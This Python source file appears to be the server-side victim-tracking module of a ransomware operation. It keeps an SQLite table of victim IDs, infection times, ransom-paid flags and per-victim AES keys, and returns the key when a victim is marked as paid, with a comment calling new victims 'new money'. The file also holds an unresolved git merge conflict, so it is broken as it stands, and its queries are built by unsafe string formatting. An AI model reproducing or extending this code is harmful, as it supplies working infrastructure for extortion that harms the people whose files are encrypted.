import sqlite3
import os 
import time
import uuid

class victims:
    def __init__(self, dbname='victims.db'):
        self.dbname = dbname
        self.vicList = []
        self.read_from_sql()

    def create_sql(self):
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS victims (
                         ID         VARCHAR(32)    NOT NULL,
                         INFTIME    VARCHAR(100)    NOT NULL,
                         RANSOM     TINYINT(1)         NOT NULL,
                         AESKEY     VARCHAR(100)    NOT NULL)""")
        db.commit()
        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
                                VALUES ('{i}', '{t}', 0, '123')""".format(
                                    i=uuid.uuid1().hex,t=time.ctime()))
        db.commit()
        db.close()
    
    def read_from_sql(self):
        if not os.path.exists(self.dbname):
            self.create_sql()
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        r = cursor.execute("""SELECT * FROM victims""")
        result = r.fetchall()
        for i in result:
            self.vicList.append({
                'id': i[0], 
                'inf_time': i[1], 
                'ransom': True if i[2] else False,
<<<<<<< HEAD
                'AES_key': i[3]})
=======
                'aes_key': i[3]})
>>>>>>> b33833f424f190a3d45f18dd6de8409bdcb4859d
        # print(self.vicList[0]['id'])
        db.close()

    def new_victim(self, vid, pkey):
        '''
        New victim means new money.

        para:
            vid: generate on victim's computer
            pkey: AES-key decoded by RSA
        '''
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
                                VALUES ('{i}', '{t}', 0, '{k}')""".format(
                                    i=vid, t=time.ctime(), k=pkey))
        db.commit()
        db.close()

    def paid(self, paidid):
        '''
        Once a victim paid ransom, response AES-key and update db.

        para:
            paidid: id of victim who paid ransom
        '''
        for index,i in enumerate(self.vicList):
            if paidid == i['id']:
                self.vicList[index]['ransom'] = True
                db = sqlite3.connect(self.dbname)
                cursor = db.cursor()
                cursor.execute("""UPDATE victims SET RANSOM=1 WHERE ID='{i}'""".format(i=paidid))
                db.commit()
                r = cursor.execute("""SELECT AESKEY FROM victims WHERE ID='{i}'""".format(i=paidid))
                result = r.fetchone()
                db.close()
                # print(result[0])
                # print(index, self.vicList[index])
                return result[0]
    
    def rm_victim(self, vid):
        for index,i in enumerate(self.vicList):
            if vid == i['id']:
                self.vicList.remove(self.vicList[index]) 
                db = sqlite3.connect(self.dbname)
                cursor = db.cursor()
                cursor.execute("""DELETE FROM victims WHERE ID='{i}'""".format(i=vid))
                db.commit()
                db.close()
                return True
        return False

if __name__ == "__main__":
    # a = victims()
    # a.paid('adec76887e2f11ea865e6014b36bdca6')
    # a.new_victim(uuid.uuid1().hex, '456')
    pass